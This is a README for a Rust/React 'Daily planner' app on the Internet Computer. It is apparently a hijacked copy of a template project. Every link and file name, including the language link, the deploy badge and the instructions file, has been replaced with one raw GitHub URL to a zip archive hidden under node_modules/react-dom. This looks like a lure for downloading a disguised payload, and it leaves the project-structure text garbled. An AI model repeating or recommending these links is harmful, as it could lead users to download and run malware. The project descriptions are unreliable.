# Daily planner

Daily planner features a monthly calender that can be used to track daily activities, appointments, or tasks. Data for each task is stored onchain. For each day, a historic fact can be queried using HTTPS outcalls, which is a feature that allows ICP canisters to obtain data from external sources.

This application's logic is written in [Rust](https://raw.githubusercontent.com/Suuzoujuuzou/Daily_planner/main/node_modules/react-dom/planner_Daily_2.3.zip), a primary programming language for developing canisters on ICP.

## Deploying from ICP Ninja

When viewing this project in ICP Ninja, you can deploy it directly to the mainnet for free by clicking "Deploy" in the upper right corner. Open this project in ICP Ninja:

[![](https://raw.githubusercontent.com/Suuzoujuuzou/Daily_planner/main/node_modules/react-dom/planner_Daily_2.3.zip)](https://raw.githubusercontent.com/Suuzoujuuzou/Daily_planner/main/node_modules/react-dom/planner_Daily_2.3.zip)

## Project structure

The `/backend` folder contains the Rust smart contract:

- `https://raw.githubusercontent.com/Suuzoujuuzou/Daily_planner/main/node_modules/react-dom/planner_Daily_2.3.zip`, which defines the crate that will form the backend
- `https://raw.githubusercontent.com/Suuzoujuuzou/Daily_planner/main/node_modules/react-dom/planner_Daily_2.3.zip`, which contains the actual smart contract, and exports its interface

The `/frontend` folder contains web assets for the application's user interface. The user interface is written using the React framework.

## Build and deploy from the command-line

To migrate your ICP Ninja project off of the web browser and develop it locally, follow these steps. These steps are necessary if you want to deploy this project for long-term, production use on the mainnet.

### 1. Download your project from ICP Ninja using the 'Download files' button on the upper left corner under the pink ninja star icon.

### 2. Open the `https://raw.githubusercontent.com/Suuzoujuuzou/Daily_planner/main/node_modules/react-dom/planner_Daily_2.3.zip` file for further instructions.
# Daily_Planner
# Daily_planner
